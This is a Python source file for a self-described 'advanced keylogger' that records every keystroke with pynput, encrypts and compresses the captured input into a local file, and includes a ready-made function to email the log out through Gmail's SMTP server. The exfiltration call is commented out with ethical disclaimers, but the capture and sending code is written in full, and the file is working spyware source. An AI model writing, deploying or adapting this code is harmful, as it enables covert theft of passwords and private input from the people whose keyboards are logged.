import os
import time
import gzip
import base64
from pynput import keyboard 
from cryptography.fernet import Fernet
import smtplib  # For email functionality (use with caution)
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Path to save the log file
LOG_FILE_PATH = "encrypted_keylog.gz"
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)
def write_encrypted_log(content):
    """
    Encrypts and writes the given content to the log file.
    Compresses the content before saving.
    """
    encrypted_content = cipher.encrypt(content.encode())
    compressed_content = gzip.compress(encrypted_content)
    
    with open(LOG_FILE_PATH, "ab") as log_file:
        log_file.write(compressed_content + b'\n')

def on_press(key):
    """
    Function called when a key is pressed.
    Logs the key into a file with formatting.
    """
    try:
        write_encrypted_log(f"'{key.char}'")
    except AttributeError:
        # Special keys (e.g., space, enter, etc.)
        special_keys = {
            keyboard.Key.space: "[SPACE]",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.esc: "[ESCAPE]",
            keyboard.Key.delete: "[DELETE]",
        }
        write_encrypted_log(special_keys.get(key, f"[{key}]"))

def on_release(key):
    """
    Function called when a key is released.
    Stops the listener if the Escape key is pressed.
    """
    if key == keyboard.Key.esc:
        write_encrypted_log("Keylogger stopped.")
        print("Exiting keylogger.")
        return False

def decrypt_log():
    """
    Decrypts the contents of the log file for review.
    """
    if os.path.exists(LOG_FILE_PATH):
        with open(LOG_FILE_PATH, "rb") as log_file:
            encrypted_logs = log_file.readlines()
        
        decrypted_content = ""
        for line in encrypted_logs:
            compressed_line = line.rstrip(b'\n')
            decrypted_content += cipher.decrypt(gzip.decompress(compressed_line)).decode()
        
        print("Decrypted logs:")
        print(decrypted_content)

def email_log():
    """
    Sends the encrypted log file to the specified email address.
    Disabled by default for ethical reasons.
    """
    try:
        with open(LOG_FILE_PATH, "rb") as log_file:
            content = log_file.read()

        # Setup SMTP server (using Gmail as an example)
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD) 

            # Create the email
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = EMAIL_ADDRESS 
            msg['Subject'] = "Encrypted Keylogger Log"
            msg.attach(MIMEText(base64.b64encode(content).decode('utf-8'), 'plain'))

            # Send the email
            server.send_message(msg)
    except Exception as e:
        print(f"Error sending email: {e}")

def start_keylogger():
    """
    Starts the keylogger and listens for keypresses.
    """
    print("Starting advanced keylogger... Press 'Escape' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Optionally send the log via email every X minutes
    # (Uncomment and configure with caution)
    # email_log()

if __name__ == "__main__":
    # Create an empty log file if it doesn't exist
    if not os.path.exists(LOG_FILE_PATH):
        with open(LOG_FILE_PATH, "wb") as log_file:
            log_file.write(b"")

    start_keylogger()
    # Decrypt the log after stopping (for testing)
    decrypt_log()
